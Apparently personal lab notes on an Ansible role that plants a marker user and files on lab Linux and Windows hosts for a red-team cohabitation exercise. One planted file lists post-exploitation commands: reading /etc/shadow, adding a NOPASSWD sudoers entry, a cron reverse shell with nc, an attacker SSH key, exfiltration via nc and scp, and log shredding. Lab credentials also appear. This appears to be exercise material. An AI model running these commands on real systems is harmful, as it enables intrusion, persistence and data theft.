
#### cohab_test.yml modification
```bash
cat cohab_test.yml 
```
![[Pasted image 20241015152047.png]]

----------------
#### inventory.ini modification
![[Pasted image 20241015152136.png]]

----------------

#### Grabbed public key of Ubuntu machine to allow SSH'ing

![[Pasted image 20241015153801.png]]

![[Pasted image 20241015153839.png]]

-----------------
#### Check to make sure ansible rule can SSH
```bash
ansible -i inventory.ini target -m ping
```

![[Pasted image 20241015154925.png]]

-----------------

#### Create new `/tasks` for injector in `main.yml`
- adds `/tmp/remember2delete` directory on rocky
- adds `stargate_safe.txt` to that directory - shows obvious cohabitation
- adds `redteamcredentials.txt` file
```bash
# tasks file for injector

- name: Ensure user redteamer1 exists
  ansible.builtin.user:
    name: redteamer1
    state: present
    create_home: yes
    shell: /bin/bash

- name: Create directory /tmp/remember2delete
  ansible.builtin.file:
    path: /tmp/remember2delete
    state: directory
    mode: '0755'

- name: Upload redteamcredentials.txt to /tmp/remember2delete
  ansible.builtin.copy:
    src: /home/bugs/ansible_playbooks/files/redteamcredentials.txt
    dest: /tmp/remember2delete/redteamcredentials.txt
    mode: '0644'

- name: Upload stargate_safe.txt to /tmp/remember2delete
  ansible.builtin.copy:
    src: /home/bugs/ansible_playbooks/files/stargate_safe.txt
    dest: /tmp/remember2delete/stargate_safe.txt
    mode: '0644'

- name: Verify both files are present
  ansible.builtin.stat:
    path: /tmp/remember2delete/redteamcredentials.txt
  register: creds_file

- ansible.builtin.stat:
    path: /tmp/remember2delete/stargate_safe.txt
  register: stargate_file

- name: Output message if both files exist
  ansible.builtin.debug:
    msg: "Both redteamcredentials.txt and stargate_safe.txt have been deployed successfully"
  when: creds_file.stat.exists and stargate_file.stat.exists

```


--------------
##### `remember2delete` directory contents
![[Pasted image 20241015155203.png]]
```bash
stargate_safe.txt
# Checking network information
ifconfig
ip a
netstat -tuln
route -n
cat /etc/hosts

# Scanning local network
nmap -sP 192.168.0.0/24
nmap -sS -Pn -p- 192.168.1.10
ping 192.168.1.10
traceroute 192.168.1.1

# Enumeration of users and system details
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow
sudo -l
ps aux | grep root

# Searching for passwords or sensitive files
find / -name "*.conf" 2>/dev/null
find / -name "*.log" 2>/dev/null
grep -i password /etc/*
grep -i pass /var/www/html/wp-config.php
cat ~/.bash_history

# Trying to access restricted directories
cd /root
ls -la /root
ls /var/log
cat /var/log/auth.log

# Attempting privilege escalation
sudo su
echo "redteam" | sudo -S su
sudo bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
chmod u+s /bin/bash
echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
gcc -o exploit exploit.c
./exploit

# Persistence
echo "*/5 * * * * root /bin/bash -c 'nc -e /bin/sh 192.168.1.100 4444'" >> /etc/crontab
crontab -e
echo "malicious_command" >> /etc/rc.local
cp /bin/bash /tmp/.bash; chmod +s /tmp/.bash
echo "ssh-ed25519 AAAAC3Nza... attacker_key" >> ~/.ssh/authorized_keys

# Lateral movement
ssh root@192.168.1.10
scp /etc/passwd root@192.168.1.15:/tmp/
rsync -av /important/data/ root@192.168.1.20:/backup/
mount -t nfs 192.168.1.100:/nfs /mnt

# Data exfiltration
tar czf /tmp/data.tar.gz /var/www/html
nc -lvp 4444 < /tmp/data.tar.gz
scp /tmp/data.tar.gz attacker@192.168.1.10:/tmp/

# Clearing tracks
history -c
rm -rf ~/.bash_history
shred -u /var/log/auth.log
rm -rf /tmp/*

```
redteamcredentials.txt
```bash
SG1Commander:Ifly5h1psOnWedn3sdayszoomzoom
```


-------------------
#### Test run Cohab on Rocky

```bash
ansible-playbook -i inventory.ini cohab_test.yml
```
![[Pasted image 20241015160950.png]]
Ensuring that ansible rules worked on `Rocky`
![[Pasted image 20241015160850.png]]

------------------
#### testing `tasks/main.yml` for both OS's
```bash
# tasks file for injector

- name: Ensure user redteamer1 exists (Linux)
  ansible.builtin.user:
    name: redteamer1
    state: present
    create_home: yes
    shell: /bin/bash
  when: ansible_facts['os_family'] in ['Debian', 'RedHat']

- name: Ensure user redteamer1 exists (Windows)
  ansible.windows.win_user:
    name: redteamer1
    state: present
    password: "ComplexPasswordHere!"
  when: ansible_facts['os_family'] == "Windows"

- name: Create directory /tmp/remember2delete (Linux)
  ansible.builtin.file:
    path: /tmp/remember2delete
    state: directory
    mode: '0755'
  when: ansible_facts['os_family'] in ['Debian', 'RedHat']

- name: Create directory C:\Windows\Tasks\remember2delete (Windows)
  ansible.windows.win_file:
    path: C:\Windows\Tasks\remember2delete
    state: directory
  when: ansible_facts['os_family'] == "Windows"

- name: Upload redteamcredentials.txt to /tmp/remember2delete (Linux)
  ansible.builtin.copy:
    src: /home/bugs/ansible_playbooks/files/redteamcredentials.txt
    dest: /tmp/remember2delete/redteamcredentials.txt
    mode: '0644'
  when: ansible_facts['os_family'] in ['Debian', 'RedHat']

- name: Upload redteamcredentials.txt to C:\Windows\Tasks\remember2delete (Windows)
  ansible.windows.win_copy:
    src: /home/bugs/ansible_playbooks/files/redteamcredentials.txt
    dest: C:\Windows\Tasks\remember2delete\redteamcredentials.txt
  when: ansible_facts['os_family'] == "Windows"

- name: Upload stargate_safe.txt to /tmp/remember2delete (Linux)
  ansible.builtin.copy:
    src: /home/bugs/ansible_playbooks/files/stargate_safe.txt
    dest: /tmp/remember2delete/stargate_safe.txt
    mode: '0644'
  when: ansible_facts['os_family'] in ['Debian', 'RedHat']

- name: Upload stargate_safe.txt to C:\Windows\Tasks\remember2delete (Windows)
  ansible.windows.win_copy:
    src: /home/bugs/ansible_playbooks/files/stargate_safe.txt
    dest: C:\Windows\Tasks\remember2delete\stargate_safe.txt
  when: ansible_facts['os_family'] == "Windows"

- name: Verify redteamcredentials.txt is present (Linux)
  ansible.builtin.stat:
    path: /tmp/remember2delete/redteamcredentials.txt
  register: creds_file
  when: ansible_facts['os_family'] in ['Debian', 'RedHat']

- name: Verify redteamcredentials.txt is present (Windows)
  ansible.windows.win_stat:
    path: C:\Windows\Tasks\remember2delete\redteamcredentials.txt
  register: creds_file_win
  when: ansible_facts['os_family'] == "Windows"

- name: Verify stargate_safe.txt is present (Linux)
  ansible.builtin.stat:
    path: /tmp/remember2delete/stargate_safe.txt
  register: stargate_file
  when: ansible_facts['os_family'] in ['Debian', 'RedHat']

- name: Verify stargate_safe.txt is present (Windows)
  ansible.windows.win_stat:
    path: C:\Windows\Tasks\remember2delete\stargate_safe.txt
  register: stargate_file_win
  when: ansible_facts['os_family'] == "Windows"

- name: Output message if both files exist (Linux)
  ansible.builtin.debug:
    msg: "Both redteamcredentials.txt and stargate_safe.txt have been deployed successfully on Linux"
  when: creds_file.stat.exists and stargate_file.stat.exists

- name: Output message if both files exist (Windows)
  ansible.builtin.debug:
    msg: "Both redteamcredentials.txt and stargate_safe.txt have been deployed successfully on Windows"
  when: creds_file_win.stat.exists and stargate_file_win.stat.exists


```
##### New `inventory.ini`
```bash
[linux]
192.168.146.139 ansible_ssh_user=root ansible_ssh_private_key_file=/path/to/private/key  # Adjust the key file path if needed

[windows]
192.168.146.141 ansible_user=Bugs ansible_password=passphrase ansible_connection=winrm ansible_winrm_transport=ntlm ansible_winrm_port=5986 ansible_winrm_server_cert_validation=ignore

```


```bash
winrm create winrm/config/Listener?Address=*+Transport=HTTPS @{Hostname="*";CertificateThumbprint="2C166A1178BB8B64088399B47984F433D233BC37"}
```

```bash
Add-LocalGroupMember -Group "Remote Management Users" -Member "Bugs"

```